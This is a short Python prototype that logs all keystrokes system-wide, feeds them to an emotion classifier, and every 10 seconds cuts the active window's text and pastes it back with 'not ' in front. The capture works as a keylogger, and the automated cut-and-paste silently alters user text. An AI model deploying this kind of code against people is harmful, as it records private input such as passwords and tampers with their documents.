import threading
import subprocess
from pynput import keyboard
import joblib
import time
import pyautogui


string_empty = ""

pipe_lr = joblib.load(open("<<path of pickle file (.pkl)>", "rb"))
def predict_emotion(text):
    return pipe_lr.predict([text])[0]
def on_press(key):
    global string_empty
    try:
        string_empty += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            string_empty += " "
        else:
            string_empty += " " + str(key) + " "

def report():
    global string_empty
    data = string_empty
    string_empty = ""  

    if data.strip():  # Avoid empty predictions
        emotion = predict_emotion(data)
        print(f"Keystrokes: {data}\nPredicted Emotion: {emotion}")
        

        time.sleep(2)  # Adjust this delay if needed
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.hotkey('ctrl', 'x')
        data1 = "not "
        for i in range(len(data1)):
            pyautogui.press(data1[i])
        pyautogui.hotkey('ctrl', 'v') # this is just for checking the script working on few libraries which are in blog!!

    timer = threading.Timer(10, report) #depends on requirement initial prototype code test!!
    timer.start()

with keyboard.Listener(on_press=on_press) as listener:
    report()
    listener.join()
